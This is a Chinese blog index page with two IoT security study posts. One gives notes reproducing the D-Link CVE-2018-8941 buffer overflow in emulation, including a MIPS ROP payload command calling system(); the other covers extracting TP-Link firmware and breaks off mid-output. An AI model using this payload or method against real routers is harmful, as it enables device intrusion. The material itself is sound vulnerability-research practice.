<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.8.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"21guns.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="have a nice day">
<meta property="og:url" content="http://21guns.top/page/9/index.html">
<meta property="og:site_name" content="have a nice day">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="have a nice day">

<link rel="canonical" href="http://21guns.top/page/9/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>have a nice day</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">have a nice day</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/05/10/iot/D-Link RCE即CVE-2018-8941漏洞分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/10/iot/D-Link RCE即CVE-2018-8941漏洞分析/" class="post-title-link" itemprop="url">D-Link RCE即CVE-2018-8941漏洞分析</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-10 09:23:44" itemprop="dateCreated datePublished" datetime="2021-05-10T09:23:44+08:00">2021-05-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-21 17:10:14" itemprop="dateModified" datetime="2022-02-21T17:10:14+08:00">2022-02-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h2 id="D-Link-RCE即CVE-2018-8941漏洞分析"><a href="#D-Link-RCE即CVE-2018-8941漏洞分析" class="headerlink" title="D-Link RCE即CVE-2018-8941漏洞分析"></a>D-Link RCE即CVE-2018-8941漏洞分析</h2><ul>
<li><p>burp抓本地包失败，将127改为本机IP</p>
</li>
<li><p>tcapi set会调用Libtcapi.so.1中的tcapi_set函数（怎么知道的？</p>
</li>
<li><p>python语句与bash命令结合</p>
<ul>
<li>python -c “print(‘A’*12+’BBBB’)”（-c后双引号跟命令</li>
<li>cat <code>python -c &quot;print(&#39;A&#39;*12+&#39;BBBB&#39;)&quot;</code>（用尖引号</li>
<li>cat $(python -c “print(‘A’*12+’BBBB’)”)（用dollar</li>
</ul>
</li>
<li><p>运行tcapi</p>
<ul>
<li>一定保证fat运行bin，否则connection error</li>
<li>形式：sudo chroot . ./qemu-mips-static -g 1234 ./userfs/bin/tcapi set Diagnostics_Entry Addr <code>python -c &quot;print(&#39;A&#39;*596+&#39;BBBB&#39;)&quot;</code></li>
</ul>
</li>
<li><p>Crash的时候，eip为42424242，s0-3均是41414141，因此，这五者可控</p>
</li>
<li><p>找gadget</p>
<ul>
<li>由于本身文件很小，可能不太好找到合适的gadget，而Libc里面的gadget比较多</li>
<li>readelf 判断程序的依赖库，readelf -d ./userfs/bin/tcapi（dynamic动态库</li>
<li>mips下的rop主要是去找到 move t9,xxx;jalrt9这样的指令来达到控制执行流程的目的，</li>
<li>其中xxx是我们在溢出的时候可以控制的寄存器。此漏洞中我们可以控制s0,s1,s2,s3 寄存器。</li>
<li>用misprop插件在IDA 搜索godget，直接搜索从栈中读取参数到寄存器的godget，mipsrop.stackfinders()</li>
<li>（mac下mipsrop插件有时会失败</li>
</ul>
</li>
<li><p>mips函数调用栈结构（从高到低</p>
<ul>
<li>t临时寄存器</li>
<li>a参数寄存器（必要时</li>
<li>参数（大于4个</li>
<li>ra返回地址</li>
<li>s保存寄存器</li>
<li>局部变量</li>
<li>（因此，ra被控制时，s0-3也可控</li>
</ul>
</li>
<li><p>一个gadget就搞定</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-05-24-094519.png" alt="image-20200524102251188"></p>
<p>  把栈中的参数放到s5，再直接放到a0作为下一个call参数，</p>
<p>  把system的地址从s0传到t9</p>
<p>  看到s5=sp+0×10，那么在payload中ra的后面16字节后再放我们需要system执行的参数</p>
</li>
<li><p>构造exp</p>
<ul>
<li>寻找libc基址：gdb中vmmap，得0x7671b000</li>
<li>寻找system地址：readelf -s ./lib/libc.so.0 | grep system，得到00059bb0（+libc = 76774bb0，</li>
<li>gadget地址：0x1656c（+libc = 7673156c</li>
<li>sudo chroot . ./qemu-mips-static ./userfs/bin/tcapi set Diagnostics_Entry Addr <code>python -c &quot;print &#39;A&#39;*580+&#39;\x76\x77\x4b\xb0&#39;+&#39;B&#39;*12+&#39;\x76\x73\x17\x08&#39;+&#39;C&#39;*24+&#39;ls&#39; &quot;</code></li>
<li>（思路正确但实测失败、python -c后要有引号、\x的16进制也要引号、python中单双引号同，不是c中单引号字符，双引号字符串</li>
</ul>
</li>
<li><p>给qemu 加上-strace参数，可以看系统调用（尽管此法获取基址失败</p>
</li>
<li><p>（思路、各种地址都正确，但实测失败，why？？？）</p>
</li>
</ul>
<blockquote>
<p>参考：<a href="https://xz.aliyun.com/t/6607" target="_blank" rel="noopener">https://xz.aliyun.com/t/6607</a></p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/05/09/iot/TP-Link wr886nv6固件分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/09/iot/TP-Link wr886nv6固件分析/" class="post-title-link" itemprop="url">TP-Link wr886nv6固件分析</a>
        </h2>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-09 14:41:33" itemprop="dateCreated datePublished" datetime="2021-05-09T14:41:33+08:00">2021-05-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-02-22 09:44:49" itemprop="dateModified" datetime="2022-02-22T09:44:49+08:00">2022-02-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>[toc]</p>
<h1 id="TP-Link-wr886nv6固件分析"><a href="#TP-Link-wr886nv6固件分析" class="headerlink" title="TP-Link wr886nv6固件分析"></a>TP-Link wr886nv6固件分析</h1><h2 id="00-准备"><a href="#00-准备" class="headerlink" title="00-准备"></a>00-准备</h2><ul>
<li>binwalk固件</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 除了前3外，其余都是lzma压缩过的数据</span></span><br><span class="line"><span class="comment"># 偏移0xa200处uncompressed size: 2365008 bytes,最大，猜测其可能包含一些有用的数据</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk wr886nv6.bin </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">12656         0x3170          U-Boot version string, <span class="string">"U-Boot 1.1.4 (May  8 2016 - 07:42:47)"</span></span><br><span class="line">12704         0x31A0          CRC32 polynomial table, big endian</span><br><span class="line">13932         0x366C          uImage header, header size: 64 bytes, header CRC: 0x773178DD, created: 2016-05-08 14:42:48, image size: 20788 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x983BDABA, OS: Linux, CPU: MIPS, image <span class="built_in">type</span>: Firmware Image, compression <span class="built_in">type</span>: lzma, image name: <span class="string">"u-boot image"</span></span><br><span class="line">13996         0x36AC          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 52148 bytes</span><br><span class="line">41472         0xA200          LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 2365008 bytes</span><br><span class="line">791104        0xC1240         LZMA compressed data, properties: 0x5A, dictionary size: 8388608 bytes, uncompressed size: 1731 bytes</span><br></pre></td></tr></table></figure>
<ul>
<li>binwalk 进一步 a200//here</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 猜测是路由器主程序（怎么判定的？</span></span><br><span class="line"><span class="comment"># vxwork主程序：集成了httpd等多种二进制的程序，vxworks = 主程序 + web文件 + kernel + uboot</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk a200-3</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">1846404       0x1C2C84        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">1853692       0x1C48FC        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">1898688       0x1CF8C0        VxWorks operating system version <span class="string">"5.5.1"</span> , compiled: <span class="string">"Sep 20 2017, 09:16:35"</span></span><br><span class="line">1955289       0x1DD5D9        Unix path: /basicRouter/wireless/qca956x/os/vxWorks/wbuf_private.h, line 279</span><br><span class="line">1955524       0x1DD6C4        Unix path: /basicRouter/wireless/qca956x/os/vxWorks/wbuf_private.h, line 365</span><br><span class="line">1964105       0x1DF849        Unix path: /basicRouter/wireless/qca956x/os/vxWorks/osdep.h, line 1525</span><br><span class="line">1967556       0x1E05C4        Copyright string: <span class="string">"Copyright(C) 2001-2011 by TP-LINK TECHNOLOGIES CO., LTD."</span></span><br><span class="line">1997244       0x1E79BC        VxWorks WIND kernel version <span class="string">"2.6"</span></span><br><span class="line">2042360       0x1F29F8        HTML document header</span><br><span class="line">2042425       0x1F2A39        HTML document footer</span><br><span class="line">2062192       0x1F7770        PEM certificate</span><br><span class="line">2062248       0x1F77A8        PEM RSA private key</span><br><span class="line">2071532       0x1F9BEC        Base64 standard index table</span><br><span class="line">2106544       0x2024B0        CRC32 polynomial table, big endian</span><br><span class="line">2107568       0x2028B0        CRC32 polynomial table, big endian</span><br><span class="line">2108592       0x202CB0        CRC32 polynomial table, big endian</span><br><span class="line">2109616       0x2030B0        CRC32 polynomial table, big endian</span><br><span class="line">2130316       0x20818C        XML document, version: <span class="string">"1.0"</span></span><br><span class="line">2149736       0x20CD68        SHA256 <span class="built_in">hash</span> constants, big endian</span><br><span class="line">2247821       0x224C8D        StuffIt Deluxe Segment (data): f</span><br><span class="line">2247852       0x224CAC        StuffIt Deluxe Segment (data): fError</span><br><span class="line">2247933       0x224CFD        StuffIt Deluxe Segment (data): f</span><br><span class="line">2364653       0x2414ED        Unix path: /2/3/4/5/6</span><br></pre></td></tr></table></figure>
<h2 id="01-vxworks主程序"><a href="#01-vxworks主程序" class="headerlink" title="01-vxworks主程序"></a>01-vxworks主程序</h2><h3 id="1-1-定位"><a href="#1-1-定位" class="headerlink" title="1-1-定位"></a>1-1-定位</h3><ul>
<li>firmware中那么多section，哪个是？</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 binwalk -Me，信息最多</span></span><br><span class="line">Scan Time:     2021-01-11 17:31:44</span><br><span class="line">Target File:   /home/lxl/Desktop/tmp/_wr886nv6.bin.extracted/A200</span><br><span class="line">MD5 Checksum:  3b45621ea1615616a548c79e971f3ad7</span><br><span class="line">Signatures:    344</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">1846404       0x1C2C84        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">1853692       0x1C48FC        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 4</span><br><span class="line">1898688       0x1CF8C0        VxWorks operating system version <span class="string">"5.5.1"</span> , compiled: <span class="string">"Sep 20 2017, 09:16:35"</span></span><br><span class="line">1955289       0x1DD5D9        Unix path: /basicRouter/wireless/qca956x/os/vxWorks/wbuf_private.h, line 279</span><br><span class="line">1955524       0x1DD6C4        Unix path: /basicRouter/wireless/qca956x/os/vxWorks/wbuf_private.h, line 365</span><br><span class="line">1964105       0x1DF849        Unix path: /basicRouter/wireless/qca956x/os/vxWorks/osdep.h, line 1525</span><br><span class="line">1967556       0x1E05C4        Copyright string: <span class="string">"Copyright(C) 2001-2011 by TP-LINK TECHNOLOGIES CO., LTD."</span></span><br><span class="line">1997244       0x1E79BC        VxWorks WIND kernel version <span class="string">"2.6"</span></span><br><span class="line">2042360       0x1F29F8        HTML document header</span><br><span class="line">2042425       0x1F2A39        HTML document footer</span><br><span class="line">2062192       0x1F7770        PEM certificate</span><br><span class="line">2062248       0x1F77A8        PEM RSA private key</span><br><span class="line">2071532       0x1F9BEC        Base64 standard index table</span><br><span class="line">2106544       0x2024B0        CRC32 polynomial table, big endian</span><br><span class="line">2107568       0x2028B0        CRC32 polynomial table, big endian</span><br><span class="line">2108592       0x202CB0        CRC32 polynomial table, big endian</span><br><span class="line">2109616       0x2030B0        CRC32 polynomial table, big endian</span><br><span class="line">2130316       0x20818C        XML document, version: <span class="string">"1.0"</span></span><br><span class="line">2149736       0x20CD68        SHA256 <span class="built_in">hash</span> constants, big endian</span><br><span class="line">2247821       0x224C8D        StuffIt Deluxe Segment (data): f</span><br><span class="line">2247852       0x224CAC        StuffIt Deluxe Segment (data): fError</span><br><span class="line">2247933       0x224CFD        StuffIt Deluxe Segment (data): f</span><br><span class="line">2364653       0x2414ED        Unix path: /2/3/4/5/6</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 tree，提取后东西也最多</span></span><br><span class="line">├── _A200.extracted</span><br><span class="line">│   ├── 1C2C84.crt</span><br><span class="line">│   ├── 1C48FC.crt</span><br><span class="line">│   ├── 1F29F8</span><br><span class="line">│   ├── 1F7770.crt</span><br><span class="line">│   ├── 1F77A8.key</span><br><span class="line">│   ├── 20818C.xml</span><br><span class="line">│   ├── 224C8D.sit</span><br><span class="line">│   ├── 224CAC.sit</span><br><span class="line">│   └── 224CFD.sit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 binwalk + firmware时，所有lzma压缩过的数据中，size最大</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk wr886nv6.bin </span><br><span class="line">41472         0xA200          LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 2365008 bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 综上，firmware中A200为主程序</span></span><br></pre></td></tr></table></figure>
<h3 id="1-2-提取"><a href="#1-2-提取" class="headerlink" title="1-2-提取"></a>1-2-提取</h3><ul>
<li>dd提取并解压a200</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 binwalk确定偏移、大小</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ binwalk wr886nv6.bin </span><br><span class="line">13996         0x36AC          LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 52148 bytes</span><br><span class="line">41472         0xA200          LZMA compressed data, properties: 0x6E, dictionary size: 8388608 bytes, uncompressed size: 2365008 bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 skip=在firmware中的偏移=41472=0xA200，count=749643=791104-41472</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ dd <span class="keyword">if</span>=wr886nv6.bin of=a200.lzma bs=1 skip=41472 count=749632  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 解压失败</span></span><br><span class="line"><span class="comment"># unlzma等同于lzma -d</span></span><br><span class="line"><span class="comment"># 其实win下的7zip是可以的，可忽略尾部的垃圾数据（尽管提示“有效数据外包含额外数据”）</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ unlzma -d a200.lzma </span><br><span class="line">unlzma: a200.lzma: Compressed data is corrupt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 hexdump看a200，注意到：MINIFS字符串，并且前面全是ff</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ hexdump a200.lzma -C |tail</span><br><span class="line">000b6290  39 30 5a fb 6f 5c 65 63  97 42 d1 69 e3 13 e5 ba  |90Z.o\ec.B.i....|</span><br><span class="line">000b62a0  03 0b ba 40 fb 20 27 05  c2 c4 64 d9 fe 98 78 de  |...@. <span class="string">'...d...x.|</span></span><br><span class="line"><span class="string">000b62b0  be 68 ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |.h..............|</span></span><br><span class="line"><span class="string">000b62c0  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span></span><br><span class="line"><span class="string">*</span></span><br><span class="line"><span class="string">000b7000  4d 49 4e 49 46 53 00 00  00 00 00 00 00 00 00 00  |MINIFS..........|</span></span><br><span class="line"><span class="string">000b7010  00 00 00 02 00 00 00 86  00 01 f4 00 00 07 55 7c  |..............U||</span></span><br><span class="line"><span class="string">000b7020  92 1c 64 4e ae 88 d9 d2  2d b4 48 ce 5c eb 69 51  |..dN....-.H.\.iQ|</span></span><br><span class="line"><span class="string">000b7030  00 00 04 8d 00 00 00 20  00 00 06 c3 00 00 00 00  |....... ........|</span></span><br><span class="line"><span class="string">000b7040</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 5 去掉minifs部分，仍失败（749568 = 0x000b7000）</span></span><br><span class="line"><span class="string">lxl@ubuntu:~/Desktop/tmp$ dd if=a200.lzma of=a200-2.lzma bs=1 skip=0 count=749568</span></span><br><span class="line"><span class="string">lxl@ubuntu:~/Desktop/tmp$ hexdump a200-2.lzma -C |tail</span></span><br><span class="line"><span class="string">000b6250  59 eb fd 7d 1b ba e1 f7  8e 80 97 5a 47 ac 2d 76  |Y..&#125;.......ZG.-v|</span></span><br><span class="line"><span class="string">000b6260  7a 5a 92 5a 70 b8 44 e1  fb 68 0c ea 65 44 66 39  |zZ.Zp.D..h..eDf9|</span></span><br><span class="line"><span class="string">000b6270  40 b2 28 ee 1c 99 d2 42  15 34 2a cb 1d 47 1a b5  |@.(....B.4*..G..|</span></span><br><span class="line"><span class="string">000b6280  50 0f 17 65 1f ee 46 eb  f9 ca c2 13 29 11 9a fe  |P..e..F.....)...|</span></span><br><span class="line"><span class="string">000b6290  39 30 5a fb 6f 5c 65 63  97 42 d1 69 e3 13 e5 ba  |90Z.o\ec.B.i....|</span></span><br><span class="line"><span class="string">000b62a0  03 0b ba 40 fb 20 27 05  c2 c4 64 d9 fe 98 78 de  |...@. '</span>...d...x.|</span><br><span class="line">000b62b0  be 68 ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |.h..............|</span><br><span class="line">000b62c0  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|</span><br><span class="line">*</span><br><span class="line">000b7000</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ unlzma a200-2.lzma </span><br><span class="line">unlzma: a200-2.lzma: Compressed data is corrupt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6 再去掉ff部分，成功</span></span><br><span class="line"><span class="comment"># （746162 = 0x000b62b0 + 2），要+2，因为count从1，而hexdump从0开始</span></span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ dd <span class="keyword">if</span>=a200.lzma of=a200-3.lzma bs=1 skip=0 count=746162</span><br><span class="line">lxl@ubuntu:~/Desktop/tmp$ hexdump a200-3.lzma -C |tail</span><br><span class="line">000b6230  f4 15 97 db 1c 72 79 dc  b0 91 d9 ac 36 85 2f 41  |.....ry.....6./A|</span><br><span class="line">000b6240  50 <span class="built_in">fc</span> 24 f5 c5 d0 b5 63  32 0c 00 d2 f5 97 d7 33  |P.$....c2......3|</span><br><span class="line">000b6250  59 eb fd 7d 1b ba e1 f7  8e 80 97 5a 47 ac 2d 76  |Y..&#125;.......ZG.-v|</span><br><span class="line">000b6260  7a 5a 92 5a 70 b8 44 e1  fb 68 0c ea 65 44 66 39  |zZ.Zp.D..h..eDf9|</span><br><span class="line">000b6270  40 b2 28 ee 1c 99 d2 42  15 34 2a cb 1d 47 1a b5  |@.(....B.4*..G..|</span><br><span class="line">000b6280  50 0f 17 65 1f ee 46 eb  f9 ca c2 13 29 11 9a fe  |P..e..F.....)...|</span><br><span class="line">000b6290  39 30 5a fb 6f 5c 65 63  97 42 d1 69 e3 13 e5 ba  |90Z.o\ec.B.i....|</span><br><span class="line">000b62a0  03 0b ba 40 fb 20 27 05  c2 c4 64 d9 fe 98 78 de  |...@. <span class="string">'...d...x.|</span></span><br><span class="line"><span class="string">000b62b0  be 68                                             |.h|</span></span><br><span class="line"><span class="string">000b62b2</span></span><br><span class="line"><span class="string">lxl@ubuntu:~/Desktop/tmp$ 